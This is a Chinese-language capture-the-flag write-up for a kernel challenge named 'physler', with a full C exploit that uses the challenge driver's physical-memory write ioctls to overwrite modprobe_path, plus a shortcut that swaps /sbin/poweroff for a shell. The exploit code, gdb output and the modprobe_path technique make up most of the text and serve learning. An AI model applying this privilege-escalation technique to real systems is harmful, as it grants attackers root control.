---
date: 2024-10-07 09:03
challenge: physler
tags:
  - kernel
---

## Unintended Solution

应该不是太复杂的内核题，不过还没什么时间看。

解法是典中典之删 `/sbin/poweroff`：

```bash
cd sbin
 
rm poweroff
 
cat << EOF > ./poweroff ; chmod +x ./poweroff
#!/bin/sh
/bin/sh
EOF
 
exit
```

---

## Solution

实际上这题的自由度也非常高，是一道有趣的题目。

> [!IMPORTANT]
> 需要注意的是系统可用的物理内存大小会影响物理地址随机化的表现，进而影响 `/proc/iomem` 中看到的偏移量：
> - 在本题设定的 `-m 96M` 物理内存情况下，内核代码的物理地址被固定为 `01000000-023fffff : Kernel code`，因此在使用 `ioremap` 进行映射时传入的地址也是固定的；
> - 若修改物理内存处于 `128M ~ 255M` 范围内并保持 `kaslr` 开启，则会发现内核代码的物理地址固定为 `04800000-05bfffff : Kernel code`；
> - 若物理内存不小于 `255M` 并保持 `kaslr` 开启，则会发现内核代码的物理地址在每次启动时发生变化，例如 `06400000-077fffff : Kernel code`。

在此之后就是比较愉快的 `patch` 环节了，~~可以重新体验某次国赛自己 patch 自己打的快乐~~，这里我选择最简单的改 `modprobe_path`：

1. **地址计算**：

观察 `iomem` 可以注意到系统内存被分为四个区域，对应内核代码、只读数据、内核数据、内核 `BSS`，由于 `modprobe_path` 是已初始化的全局变量，故被存放在 `02c00000-0303327f : Kernel data` 范围内。

接下来到 gdb 中查找 `/sbin/modprobe` 字符串（排除位于直接映射区的结果），得到目标物理地址 `0x2c00000+0x1d5820`：

```bash
pwndbg> search "/sbin/modprobe"
Searching for byte: b'/sbin/modprobe'
[pt_ffff9820c2b5f] 0xffff9820c2dd5820 '/sbin/modprobe'
[pt_ffffffffba600] 0xffffffffba7d5820 '/sbin/modprobe'
pwndbg> vmmap 0xffffffffba7d5820
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
0xffffffffb9e00000 0xffffffffba55f000 r--p   75f000      0 [pt_ffffffffb9e00]
►xffffffffba600000 0xffffffffbaa54000 rw-p   454000      0 [pt_ffffffffba600] +0x1d5820
0xffffffffbaf3a000 0xffffffffbaf49000 rw-p     f000      0 [pt_ffffffffbaf3a]
```

2. **任意地址写原语**：

在这道题目中可以通过 `ioremap` 和 `memcpy_toio` 获得非常强的任意地址写：无视目标地址权限的写入！此外由于本题物理地址有限，不存在物理地址随机化，故地址也是已知的。

```c
void aaw(size_t addr, const char *data, int size) {
    struct ioctl_map map;
    struct ioctl_write _write;
    map.phys_addr = addr;
    map.size = 0x1000;
    _write.size = size;
    _write.in_data = data;
    ioctl(fd, IOCTL_MAP_PHYS_ADDR, &map);
    ioctl(fd, IOCTL_WRITE_PHYS_MEM, &_write);
}
```

3. **完整利用**：

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"

void modprobe_path_template() {
    system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/dummy");
    system("echo \"#!/bin/sh\" >> /tmp/xxx");
    system("echo \"cp /root/flag.txt /tmp/flag && chmod a+r /tmp/flag\" >> "
           "/tmp/xxx");
    system("chmod +x /tmp/dummy");
    system("chmod +x /tmp/xxx");
    execve("/tmp/dummy", NULL, NULL);
    system("cat /tmp/flag");
}

#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_WRITE_PHYS_MEM 0x3003

struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

struct ioctl_write {
    unsigned long size;
    unsigned char *in_data;
};

int fd;
char tmp_xxx[] = "/tmp/xxx";

void aaw(size_t addr, const char *data, int size) {
    struct ioctl_map map;
    struct ioctl_write _write;
    map.phys_addr = addr;
    map.size = 0x1000;
    _write.size = size;
    _write.in_data = data;
    ioctl(fd, IOCTL_MAP_PHYS_ADDR, &map);
    ioctl(fd, IOCTL_WRITE_PHYS_MEM, &_write);
}

int main() {
    fd = open("/dev/physler", 2);
    aaw(0x2c00000 + 0x1d5820, tmp_xxx, strlen(tmp_xxx) + 1);
    modprobe_path_template();
    return 0;
}
```

> [!TIP]
> 由于这道题提供了很强的任意地址写能力，解法也很自由。也可以看看 `open` / `setuid` 等函数的调用链，在内核代码中加入 `patch` 也可以完成利用。
